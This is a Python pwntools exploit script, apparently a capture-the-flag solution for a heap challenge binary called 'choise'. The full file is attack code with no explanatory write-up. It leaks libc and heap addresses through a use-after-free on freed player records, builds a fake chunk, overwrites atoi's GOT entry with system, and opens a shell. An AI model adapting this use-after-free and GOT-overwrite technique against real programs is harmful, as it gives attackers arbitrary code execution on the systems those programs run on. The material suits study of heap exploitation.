#coding=utf-8
from pwn import *
local = 1
exec_file="./choise"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = False)
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("")

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your choice: ",str(idx))
def add(name,attack=0,defense=0,speed=0x21,pre=0):
    menu(1)
    a.sendlineafter("Enter player name: ",name)
    a.sendlineafter("Enter attack points: ",str(attack))
    a.sendlineafter("Enter defense points: ",str(defense))
    a.sendlineafter("Enter speed: ",str(speed))
    a.sendlineafter("Enter precision: ",str(pre))
def delete(idx):
    menu(2)
    a.sendlineafter("Enter index: ",str(idx))
def select(idx):
    menu(3)
    a.sendlineafter("Enter index: ",str(idx))
def edit_name(name):
    menu(4)
    menu(1)
    a.sendafter("Enter new name: ",name)
    menu(0)
def show():
    menu(5)

add('A'*0x88)#0

add('A'*0x17)#1
add('A'*0x67)#2
select(0)
delete(0)
show()
a.recvuntil("Name: ")
libc_base=u64(a.recv(6)+'\x00\x00')-libc.symbols["__malloc_hook"]-0x10-88
fuck(libc_base)

select(1)
delete(1)
show()
a.recvuntil("P: ")
heap_base = eval(a.recvuntil(",",drop=True))-0xe0
fuck(heap_base)
fake_chunk_addr = heap_base+0x110
edit_name(p64(fake_chunk_addr)+'\n')
#debug()
atoi_got = elf.got["atoi"]
add('A'*0x67)#0
add(p64(atoi_got)[:6])
select(2)
menu(4)
menu(1)
a.sendafter("Enter new name: ",p64(libc_base+libc.symbols["system"])+'\n')
menu("sh\x00")
#debug()
a.interactive()









